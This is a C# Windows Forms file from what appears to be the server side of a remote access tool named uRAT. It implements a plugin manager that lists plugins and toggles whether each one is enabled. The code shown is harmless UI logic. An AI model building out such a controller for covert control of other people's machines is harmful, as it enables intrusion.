using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace uRAT.Server.Forms
{
    public partial class PluginManagerForm : Form
    {
        public PluginManagerForm()
        {
            InitializeComponent();
        }

        private void PluginManager_Load(object sender, EventArgs e)
        {
            PopulatePluginList();
        }

        private void PopulatePluginList()
        {
            // will overflow if we don't do this
            listView1.ItemChecked -= listView1_ItemChecked;
            listView1.Items.Clear();
            foreach (var pluginMetadata in Globals.SettingsHelper.FetchAllPlugins())
            {
                var lvItm = new ListViewItem(pluginMetadata.Name);
                lvItm.SubItems.Add(pluginMetadata.Author);
                lvItm.SubItems.Add(pluginMetadata.Version.ToString());
                lvItm.SubItems.Add(pluginMetadata.Description);
                lvItm.Checked = pluginMetadata.Enabled;
                lvItm.Tag = pluginMetadata.Guid;
                listView1.Items.Add(lvItm);
            }
            listView1.ItemChecked += this.listView1_ItemChecked;
        }

        private void listView1_ItemChecked(object sender, ItemCheckedEventArgs e)
        {
            Globals.SettingsHelper.TogglePluginStatus((Guid) e.Item.Tag, e.Item.Checked);
            PopulatePluginList();
        }

        private void PluginManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (ListViewItem lvItm in listView1.Items)
            {
                Globals.PluginAggregator.LoadedPlugins.First(p => p.PluginHostGuid == (Guid) lvItm.Tag).Enabled =
                    lvItm.Checked;

            }
        }
    }
}

